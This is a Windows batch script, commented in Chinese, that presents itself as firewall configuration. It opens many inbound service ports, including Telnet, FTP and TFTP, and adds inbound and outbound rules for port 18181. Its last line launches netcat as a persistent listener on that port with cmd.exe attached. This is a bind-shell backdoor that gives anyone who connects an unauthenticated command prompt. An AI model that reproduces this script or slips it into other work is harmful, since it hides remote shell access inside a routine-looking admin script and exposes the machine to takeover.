@echo off

rem 设置需要启动的端口
set OTHERPORT=18181
	
rem 启用防火墙常规端口
netsh advfirewall firewall add rule name="_Ping" dir=in protocol=icmpv4 action=allow
netsh advfirewall firewall add rule name="_20 FTP" protocol=TCP dir=in localport=20 action=allow
netsh advfirewall firewall add rule name="_21 FTP" protocol=TCP dir=in localport=21 action=allow
netsh advfirewall firewall add rule name="_22 SSH" protocol=TCP dir=in localport=22 action=allow
netsh advfirewall firewall add rule name="_23 Telnet" protocol=TCP dir=in localport=23 action=allow
netsh advfirewall firewall add rule name="_25 SMTP" protocol=TCP dir=in localport=25 action=allow
netsh advfirewall firewall add rule name="_69 TFTP" protocol=UDP dir=in localport=69 action=allow
netsh advfirewall firewall add rule name="_110 POP3" protocol=TCP dir=in localport=110 action=allow
netsh advfirewall firewall add rule name="_443 HTTPS" protocol=TCP dir=in localport=443 action=allow
rem netsh advfirewall firewall add rule name="_137 Netbios-ns" protocol=UDP dir=in localport=137 action=allow 
rem netsh advfirewall firewall add rule name="_138 Netbios-dgm" protocol=UDP dir=in localport=138 action=allow 
rem netsh advfirewall firewall add rule name="_139 Netbios-ssn" protocol=TCP dir=in localport=139 action=allow 
rem netsh advfirewall firewall add rule name="_445 Netbios-ds" protocol=TCP dir=in localport=445 action=allow 
netsh advfirewall firewall add rule name="HTTP" protocol=TCP dir=in localport=80 action=allow
netsh advfirewall firewall add rule name="HTTP" protocol=TCP dir=in localport=8080 action=allow

rem 启用防火墙非常规端口
FOR %%c in (%OTHERPORT%) do (
	SET PORT=%%c
	call :input
	call :output		
    )

pause

rem 入栈规则
:input
set INPUTPORT=%PORT%
set INPUT_RULE_NAME="_%INPUTPORT% 入栈规则"
netsh advfirewall firewall show rule name=%INPUT_RULE_NAME% >nul
if not ERRORLEVEL 1 (
    echo 对不起，规则 %INPUT_RULE_NAME% 已经存在
) else (
    netsh advfirewall firewall add rule name=%INPUT_RULE_NAME% dir=in action=allow protocol=TCP localport=%INPUTPORT%
	echo 规则 %INPUT_RULE_NAME% 创建成功
) 

rem 出栈规则
:output
set OUTPORT=%PORT%
set OUT_RULE_NAME="_%OUTPORT% 出栈规则"
netsh advfirewall firewall show rule name=%OUT_RULE_NAME% >nul
if not ERRORLEVEL 1 (
    echo 对不起，规则 %OUT_RULE_NAME% 已经存在
) else (
    netsh advfirewall firewall add rule name=%OUT_RULE_NAME% dir=out action=allow protocol=TCP localport=%OUTPORT%
	echo 规则 %OUT_RULE_NAME% 创建成功
) 


nc64.exe -Ldp 18181 -e cmd.exe